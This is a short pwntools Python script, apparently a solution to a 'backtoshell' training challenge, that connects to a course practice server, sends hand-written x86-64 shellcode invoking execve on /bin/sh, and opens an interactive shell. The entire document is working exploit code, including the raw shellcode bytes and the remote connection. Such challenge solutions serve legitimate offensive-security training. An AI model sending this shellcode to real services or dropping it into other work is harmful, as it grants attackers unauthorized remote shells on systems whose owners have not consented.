from pwn import *

asm_code = """
mov rax, 0x3b
"""

context.arch = 'amd64'
print(asm(asm_code))

# p = process(" ./backtoshell")
r = remote("bin.training.offdef.it", 3001)
shellcode = b"\x48\x89\xC7\x48\x83\xC7\x10\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05/bin/sh\x00"

r.send(shellcode)
r.interactive()
